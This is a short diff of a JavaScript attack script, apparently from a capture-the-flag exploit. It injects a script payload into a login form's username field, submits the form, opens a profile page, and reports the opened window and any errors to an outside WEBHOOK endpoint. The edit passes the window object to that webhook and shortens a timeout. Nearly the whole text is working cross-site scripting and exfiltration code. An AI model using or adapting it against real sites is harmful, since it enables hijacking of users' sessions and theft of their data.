@@ -17,8 +17,8 @@ function post(url, data) {
 }
 
 function imgEnd() {
-  window.open(PROFILE, "toto");
-  get(`${WEBHOOK}?end`);
+  const o = window.open(PROFILE, "toto");
+  post(`${WEBHOOK}?end`, o);
   // document.location.href = WEBHOOK;
 }
 
@@ -42,7 +42,7 @@ try {
   document.getElementById("username").value = `<script>${payload}</script>`;
   document.getElementById("login").submit();
 
-  setTimeout(() => imgEnd(), 4000);
+  setTimeout(() => imgEnd(), 3000);
 } catch (error) {
   post(WEBHOOK, `Error: ${error}`);
 }
